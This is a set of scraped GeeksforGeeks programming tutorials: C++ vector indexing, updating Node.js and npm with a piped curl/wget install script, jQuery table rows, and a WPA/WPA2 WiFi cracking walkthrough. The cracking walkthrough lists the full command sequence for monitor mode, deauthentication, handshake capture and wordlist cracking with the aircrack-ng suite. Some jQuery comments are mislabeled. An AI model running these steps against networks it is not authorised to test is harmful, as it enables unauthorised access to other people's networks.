Try OnceTop 10 DevOps Tools That You Can Try in 2020Which language should you learn first if you want to make an app?13 Things You Should Know Before You Enter In Web DevelopmentTop 10 Cybersecurity Tools That You Should KnowTop 5 Skills You Must Know Before You Learn ReactJSPython IDEs For Data ScienceWhy should you not Hack Facebook!6 Best CSS frameworks You should Know to design Attractive Websites13 Technical Skills You Should Have As A DeveloperUI vs UX Design : Which Career Option Should You Choose?12 Reasons Why You Should Learn Python in 201910 Things You Should Know As a Web Developer8 Reasons Why You Should Switch To Kotlin From JavaShould You Connect Your Devices to Free Wi-Fi?What is Dark Web and Why You Should Access it Carefully!Why You Should Become a Self-Taught Programmer?10 Reasons Why You Should Choose Python For Big DataWhy You Should Opt Out From Ubuntu?akhaleqh02A computer science student who loves to gain knowledge and share knowledge about the topics which interests all the tech geeksIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : C++GBlog Practice Tags : CPP thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Best Books to Learn Data Science for Beginners and Experts Next last_page Importance of Practical Application In Engineering Programs Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in C++ Inheritance in C++Why Java Language is Slower Than CPP for Competitive Programming?Constructors in C++Object Oriented Programming in C++Virtual Function in C++ Most visited in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Socket Programming in C/C++Differences between Procedural and Object Oriented ProgrammingTop 10 Projects For Beginners To Practice HTML and CSS Skills room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to find index of a given element in a Vector in C++ - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ How to find index of a given element in a Vector in C++std::find in C++Substring in C++string find in C++std::search in C++std::search_n with example in C++library in C++ STLAlgorithm Library | C++ Magicians STL AlgorithmWhat are the default values of static variables in C?Understanding “volatile” qualifier in C | Set 2 (Examples)Const Qualifier in CInitialization of static variables in CUnderstanding “register” keyword in CUnderstanding “extern” keyword in CStorage Classes in CStatic Variables in CMemory Layout of C ProgramsHow to deallocate memory without using free() in C?Difference Between malloc() and calloc() with ExamplesDynamic Memory Allocation in C using malloc(), calloc(), free() and realloc()How to dynamically allocate a 2D array in C?How to pass a 2D array as a parameter in C?Multidimensional Arrays in C / C++2D Vector In C++ With User Defined SizeVector of Vectors in C++ STL with ExamplesVector in C++ STLThe C++ Standard Template Library (STL)Map in C++ Standard Template Library (STL)std::sort() in C++ STLArrays in C/C++ How to find index of a given element in a Vector in C++ Last Updated: 29-10-2020 Given a vector V consisting of N integers and an element K, the task is to find the index of element K in the vector V. If the element does not exist in vector then print -1.Examples: Input: V = {1, 45, 54, 71, 76, 17}, K = 54 Output: 2 Explanation : The index of 54 is 2, hence output is 2.Input: V = {3, 7, 9, 11, 13}, K = 12 Output: -1 Recommended: Please try your approach on {IDE} first, before moving on to the solution. Approach: Follow the steps below to solve the problem: find(): Used to find the position of element in the vector. Subtract from the iterator returned from the find function, the base iterator of the vector . Finally return the index returned by the subtraction. Below is the implementation of the above approach : C++ filter_none edit close play_arrow link brightness_4 code // C++ program to find the index // of an element in a vector #include <bits/stdc++.h> using namespace std; // Function to print the // index of an element void getIndex(vector<int> v, int K) { auto it = find(v.begin(), v.end(), K); // If element was found if (it != v.end()) { // calculating the index // of K int index = it - v.begin(); cout << index << endl; } else { // If the element is not // present in the vector cout << "-1" << endl; } } // Driver Code int main() { // Vector vector<int> v = { 1, 45, 54, 71, 76, 17 }; // Value whose index // needs to be found int K = 54; getIndex(v, K); return 0; } chevron_right filter_none Output: 2 Time Complexity: O(N) Auxiliary Space: O(1) Rated as one of the most sought after skills in the industry, own the basics of coding with our C++ STL Course and master the very concepts by intense problem-solving. My Personal Notes arrow_drop_up Save Recommended Posts:vector::front() and vector::back() in C++ STLvector::push_back() and vector::pop_back() in C++ STLvector::operator= and vector::operator[ ] in C++ STLvector::crend() & vector::crbegin() with examplevector :: cbegin() and vector :: cend() in C++ STLHow to flatten a Vector of Vectors or 2D Vector in C++vector::empty() and vector::size() in C++ STLvector::begin() and vector::end() in C++ STLvector::at() and vector::swap() in C++ STLHow to find the maximum element of a Vector using STL in C++?How to find the minimum and maximum element of a Vector using STL in C++?Program to find frequency of each element in a vector using map in C++Number of permutations such that sum of elements at odd index and even index are equalLast element of vector in C++ (Accessing and updating)How to erase an element from a vector using erase() and reverse_iterator?Delete array element in given index range [L - R]How to find common elements between two Vector using STL in C++?How to find the sum of elements of a Vector using STL in C++?Find and print duplicate words in std::vector<string> using STL functionsSorting 2D Vector in C++ | Set 2 (In descending order by row and column)hrishikeshkonderuCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : sethaditya35 Article Tags : C++cpp-vectorSTL Practice Tags : STLCPP thumb_up 1 To-do Done 3 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Introduction to Complex Objects and Composition Next last_page std::remove_volatile in C++ with Examples Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in C++ Inheritance in C++Why Java Language is Slower Than CPP for Competitive Programming?Constructors in C++Object Oriented Programming in C++Initialize a vector in C++ (5 different ways) More related articles in C++ Virtual Function in C++C++ Classes and ObjectsPolymorphism in C++C++ Data TypesTemplates in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to update Node.js and NPM to next version ? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ PHP | imagecopyresized() functionNode.js Child ProcessRun Python script from Node.js using child process spawn() methodRun Python Script using PythonShell from Node.jsHow do you run JavaScript script through the Terminal?Installation of Node.js on LinuxHow to update Node.js and NPM to next version ?How to update NPM ?Node.js | NPM (Node Package Manager)Node.js | package.jsonPHP | pclose( ) FunctionPHP | popen( ) FunctionSplit a comma delimited string into an array in PHPHow to create comma separated list from an array in PHP ?Create a comma separated list from an array in JavaScriptConvert comma separated string to array using JavaScriptHow to get random value out of an array in PHP?PHP | shuffle() FunctionTop 10 Projects For Beginners To Practice HTML and CSS SkillsResize image proportionally with CSSHow to insert spaces/tabs in text using HTML/CSS?CSS to put icon inside an input element in a formHow to apply !important in CSS?How to vertically center text with CSS?How to position a div at the bottom of its container using CSS?How to make elements float to center?How to convert JSON string to array of JSON objects using JavaScript ?Set the opacity only to background color not on the text in CSSTypes of CSS (Cascading Style Sheet) How to update Node.js and NPM to next version ? Last Updated: 30-06-2020 Node.js is a cross-platform JavaScript environment that can be used for server-side scripting. Due to its non-blocking workflow, Node.js is popular among the web developers for building a dynamic web application. Node Package Manager also known as npm is the package manager for Node.js. It also serves as a command-line utility for interacting with the npm online repository for package installation, version management, and dependency management. It is important to have Node.js installed in order to use npm. Also, working with updated versions of Node.js and npm ensures better performance and added features. Follow the link to download and install Node.js: Download Node.js Update Node.js to the latest stable version: Node.js can be updated from the official Node.js website as well as through the command line using Node Version Manager(nvm). nvm was originally developed for Linux systems, however nvm can be installed separately for Windows system by the following steps: Go to this site Install and unzip the nvm-setup.zip file From cmd type nvm -v to ensure nvm is installed. After installing nvm, the following can be done to update Node.js to the latest version: nvm install <version> Check the list of available Node.js version in the system using the following command: nvm list To use the desired version, use the following command: nvm use <version> Update npm: To update NPM, use the following command: npm install -g npm Output: Below is a demonstration for updating Node.js and npm versions for Linux systems. Install nvm in Linux: # curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash OR # wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash Check if nvm is installed successfully Open a new terminal nvm -v To install latest version of node, use the following command. # nvm install node or # nvm install -lts or # nvm install Check all the available version of node on the system: # nvm ls Use a particular version # nvm use Update npm to latest version: # npm install -g npm My Personal Notes arrow_drop_up Save Recommended Posts:How to install the previous version of node.js and npm ?How to update NPM ?Nodejs | Automatic restart NodeJs server with nodemonWhat are the differences between npm and npx ?Steps to Create and Publish NPM packagesHow to use External Modules and NPM in a project ?Difference between npm and yarnHow to import SASS through npm ?How to import LESS through npm ?Introduction to NPM scriptsWhat is the meaning of --save for NPM install ?Node.js NPM arraybuffer-to-string ModuleNode.js NPM string-to-arraybuffer ModuleNode.js NPM shortid ModuleNode.js NPM uuidHow to install modules without npm in node.js ?Node.js | process.version PropertyNode.js | os.version() MethodHow to detect the version of a browser ?Signup Form Using Nodejs and MongoDBShreyasi_ChakrabortyCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : CSSHTMLNode.jsNode.js-Misc Practice Tags : HTML thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page JavaScript String prototype Property Next last_page How to define a part of text in an alternate voice or mood using HTML5 ? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in CSS How to Create Time-Table schedule using HTML ?HTML | <frame> TagHow to Upload Image into Database and Display it using PHP ?How to Dynamically Add/Remove Table Rows using jQuery ?How to fetch data from JSON file and display in HTML table using jQuery ? Most visited in HTML How to Create Time-Table schedule using HTML ?HTML | colspan AttributeHow to set input type date in dd-mm-yyyy format using HTML ?HTML | HeadingForm validation using HTML and JavaScript room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to Hack WPA/WPA2 WiFi Using Kali Linux? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ How Should I Start Learning Ethical Hacking on My Own?Top 5 Places to Practice Ethical HackingTop 5 Reasons to Learn Ethical HackingTop 5 Industry Tools for Ethical Hacking to Learn in 2020Top 10 Kali Linux Tools For HackingKali Linux – Hacking Wi-FiHow to Hack WPA/WPA2 WiFi Using Kali Linux?chroot command in Linux with examplesLinux Virtualization – Chroot JailLinux Virtualization : Resource throttling using cgroupsLinux Virtualization : Linux Containers (lxc)Linux File Hierarchy Structureproc file system in Linuxtop command in Linux with Examplesps command in Linux with Exampleskill command in Linux with Exampleschmod command in Linux with exampleschown command in Linux with Exampleschgrp command in Linux with Examplesgroupadd command in Linux with examplesuseradd command in Linux with Examplesuserdel command in Linux with Examplesusermod command in Linux with ExamplesIntroduction to Ethical HackingHow to Set Up a Personal Lab for Ethical Hacking?Sed Command in Linux/Unix with examplesAWK command in Unix/Linux with examplescut command in Linux with examplesgrep command in Unix/LinuxZIP command in Linux with examples How to Hack WPA/WPA2 WiFi Using Kali Linux? Last Updated: 30-06-2020 “Hacking Wifi” sounds really cool and interesting. But actually hacking wifi practically is much easier with a good wordlist. But this world list is of no use until we don’t have any idea of how to actually use that word list in order to crack a hash. And before cracking the hash we actually need to generate it. So, below are those steps along with some good wordlists to crack a WPA/WPA2 wifi. Note: Use the below methods only for educational/testing purposes on your own wifi or with the permission of the owner. Don’t use this for malicious purposes. So, boot up Kali Linux. Open the terminal window. And perform the following steps. Step 1: ifconfig(interface configuration) : To view or change the configuration of the network interfaces on your system. ifconfig Here, eth0 : First Ethernet interface l0 : Loopback interface wlan0 : First wireless network interface on the system. (This is what we need.) Step 2: Stop the current processes which are using the WiFi interface. airmon-ng check kill Step 3: To start the wlan0 in monitor mode. airmon-ng start wlan0 Step 4: To view all the Wifi networks around you. airodump-ng wlan0mon Here, airodump-ng : For packet capturing wlan0mon : Name of the interface (This name can be different on the different devices) Press Ctrl+C to stop the process when you have found the target network. Step 5: To view the clients connected to the target network. airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon Here, airodump-ng : For packet capturing -c : Channel –bssid : MAC address of a wireless access point(WAP). -w : The Directory where you want to save the file(Password File). wlan0mon : Name of the interface. Step 6: Open a new terminal window to disconnect the clients connected to the target network. aireplay-ng -0 10 -a 80:35:C1:13:C1:2C wlan0mon aireplay-ng : To inject frames -0 : For deauthentication 10 : No. of deauthentication packets to be sent -a : For the bssid of the target network wlan0mon : Name of the interface. When the client is disconnected from the target network. He tries to reconnect to the network and when he does you will get something called WPA handshake in the previous window of the terminal. Now, we are done with capturing the packets. So, now you can close the terminal window. Step 7. To decrypt the password. Open the Files application. Here, hacking-01.cap is the file you need. aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program -a : -a2 for WPA2 & -a for WPA network -b : The BSSID of the target network -w : Location of the wordlist file /root/hacking-01.cap : Location of the cap file You can download the file of common passwords from the internet and if you want to create your own file then you can use the crunch tool My Personal Notes arrow_drop_up Save Recommended Posts:How to Hack a Open WiFi?Difference Between Arch Linux and Kali LinuxTABBY Hack The Box Walkthrough for Root FlagTABBY Hack The Box Walkthrough for User FlagHow to Change the Mac Address in Kali Linux Using Macchanger?Getting into Android OS remotely using Kali LinuxKali Linux - Password Cracking ToolDifference Between Ubuntu and Kali LinuxHow to Install Lazy Script in Kali Linux?Kali Linux ToolsWhat is Vulnerability Scanning in Kali Linux?Introduction to Kali LinuxKali Linux - File ManagementKali Linux - Default PasswordsKali Linux - Crunch UtilityHow to Create Reverse Shells with Netcat in Kali Linux?Kali Linux - Terminal and ShellKali Linux - Command Line EssentialsHow to Change the username or userID in Kali Linux?Difference Between Fedora and Kali LinuxquitehackerCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Linux-UnixKali-Linux thumb_up 1 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Difference Between Arch Linux and Kali Linux Next last_page Difference Between Fedora and Kali Linux Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Linux-Unix cp command in Linux with examplesTCP Server-Client implementation in CSORT command in Linux/Unix with examples'crontab' in Linux with ExamplesUDP Server-Client implementation in C More related articles in Linux-Unix Conditional Statements | Shell Scriptcurl command in Linux with Examplestouch command in Linux with Examplesdiff command in Linux with examplesecho command in Linux with Examples room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to Dynamically Add/Remove Table Rows using jQuery ? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ HTML | Responsive Modal Login FormHow to create a responsive Modal Sign-Up form for a Website?Form validation using HTML and JavaScriptHow to Create a Form Dynamically with the JavaScript?Create a Form Dynamically using Dform and jQueryHow to Dynamically Add/Remove Table Rows using jQuery ?How to add table row in a table using jQuery?How to insert new row at a certain index in a table in jQuery ?How to change the Content of a <textarea> using JavaScript ?How to get the value of a textarea in jQuery ?HTML | DOM Textarea select() MethodHTML | DOM Mark ObjectHTML5 | IntroductionHTML5 | article tagHTML5 | <aside> TagHTML5 | <footer> TagHTML 5 | <header> TagHTML5 | SemanticsDifference between HTML and HTML5Difference between <nav> and <menu> tag in HTML5Top 10 Projects For Beginners To Practice HTML and CSS SkillsResize image proportionally with CSSHow to insert spaces/tabs in text using HTML/CSS?CSS to put icon inside an input element in a formHow to apply !important in CSS?How to vertically center text with CSS?How to position a div at the bottom of its container using CSS?How to make elements float to center?How to convert JSON string to array of JSON objects using JavaScript ?Set the opacity only to background color not on the text in CSS How to Dynamically Add/Remove Table Rows using jQuery ? Last Updated: 29-06-2020 In this article, we will learn how to dynamically add/remove rows from an HTML table using jQuery. Before reading this article, make sure you have some basic idea about jQuery. If not, you can learn it from the links mentioned below. jQuery tutorials jQuery Official API Docs HTML code: Let us start by defining the basic HTML structure of the web page. html filter_none edit close play_arrow link brightness_4 code <body> <div class="container pt-4"> <div class="table-responsive"> <table class="table table-bordered"> <thead> <tr> <th class="text-center">Row Number</th> <th class="text-center">Remove Row</th> </tr> </thead> <tbody id="tbody"> </tbody> </table> </div> <button class="btn btn-md btn-primary" id="addBtn" type="button"> Add new Row </button> </div> </body> chevron_right filter_none Initially, the table is empty and has no rows. We will start by adding rows dynamically inside the table body and then see how to remove a row from the table. Adding a row:To add a row, define a variable that keeps the count of the total number of that now exists in the table. Then we will use the jQuery “click” event to detect a click on the add row button and then use the .append() method of jQuery to add a row in the table. Each row element has been assigned an id Ri that we will later use to delete a row. Each element has a row index column and remove the button column. The code is as follows. javascript filter_none edit close play_arrow link brightness_4 code // Node.js program to demonstrate the // Node.js filehandle.read() Method // Denotes total number of rows. var rowIdx = 0; // jQuery button click event to add a row. $('#addBtn').on('click', function () { // Adding a row inside the tbody. $('#tbody').append(`<tr id="R${++rowIdx}"> <td class="row-index text-center"> <p>Row ${rowIdx}</p></td> <td class="text-center"> <button class="btn btn-danger remove" type="button">Remove</button> </td> </tr>`); }); chevron_right filter_none Note: The `R${var}` is a way of concatenating a variable with a string in the new JavaScript ES6 syntax.Removing a row: Removing a row is a bit complicated. There are two issues. Firstly, as each row is being added dynamically, we cannot detect the click of a remove button directly by using the “click” jQuery event as it is a “direct” binding which will attach the handler to already existing elements. It will not get bound to the future elements. Secondly, when we delete a row, we will need to keep up the index, i.e., if we delete the second row, the third row becomes the second and hence we need the to modify the id and the row index text.To tackle the first problem we will use delegation and then we can handle the events of a dynamically added element. In order to tackle the second problem, we will get all the rows next to the row where the remove button is clicked using the .nextAll() method of jQuery and then iterate across each of these elements to modify the row index and row id. The code is as follows: javascript filter_none edit close play_arrow link brightness_4 code // Node.js program to demonstrate the // Node.js filehandle.read() Method // jQuery button click event to remove a row $('#tbody').on('click', '.remove', function () { // Getting all the rows next to the // row containing the clicked button var child = $(this).closest('tr').nextAll(); // Iterating across all the rows // obtained to change the index child.each(function () { // Getting <tr> id. var id = $(this).attr('id'); // Getting the <p> inside the .row-index class. var idx = $(this).children('.row-index').children('p'); // Gets the row number from <tr> id. var dig = parseInt(id.substring(1)); // Modifying row index. idx.html(`Row ${dig - 1}`); // Modifying row id. $(this).attr('id', `R${dig - 1}`); }); // Removing the current row. $(this).closest('tr').remove(); // Decreasing the total number of rows by 1. rowIdx--; }); chevron_right filter_none This code can be modified in several ways according to the needs. For example, you can try to fix the first row in the table, such that there always exists at least one row inside the table body. One should not be able to delete the row if the row count is one. Final code: This following code is the combination of the above sections. filter_none edit close play_arrow link brightness_4 code <!DOCTYPE html> <html> <head> <title>test page</title> <link rel="stylesheet" href= "https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity= "sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"> <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"> </script> <script src= "https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"> </script> <script src= "https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"> </script> <script> $(document).ready(function () { // Denotes total number of rows var rowIdx = 0; // jQuery button click event to add a row $('#addBtn').on('click', function () { // Adding a row inside the tbody. $('#tbody').append(`<tr id="R${++rowIdx}"> <td class="row-index text-center"> <p>Row ${rowIdx}</p> </td> <td class="text-center"> <button class="btn btn-danger remove" type="button">Remove</button> </td> </tr>`); }); // jQuery button click event to remove a row. $('#tbody').on('click', '.remove', function () { // Getting all the rows next to the row // containing the clicked button var child = $(this).closest('tr').nextAll(); // Iterating across all the rows // obtained to change the index child.each(function () { // Getting <tr> id. var id = $(this).attr('id'); // Getting the <p> inside the .row-index class. var idx = $(this).children('.row-index').children('p'); // Gets the row number from <tr> id. var dig = parseInt(id.substring(1)); // Modifying row index. idx.html(`Row ${dig - 1}`); // Modifying row id. $(this).attr('id', `R${dig - 1}`); }); // Removing the current row. $(this).closest('tr').remove(); // Decreasing total number of rows by 1. rowIdx--; }); }); </script> </head> <body> <div class="container pt-4"> <div class="table-responsive"> <table class="table table-bordered"> <thead> <tr> <th class="text-center">Row Number</th> <th class="text-center">Remove Row</th> </tr> </thead> <tbody id="tbody"> </tbody> </table> </div> <button class="btn btn-md btn-primary" id="addBtn" type="button"> Add new Row </button> </div> </body> </html> chevron_right filter_none My Personal Notes arrow_drop_up Save Recommended Posts:How to dynamically insert id into table element using JavaScript ?How to Count Number of Rows and Columns in a Table 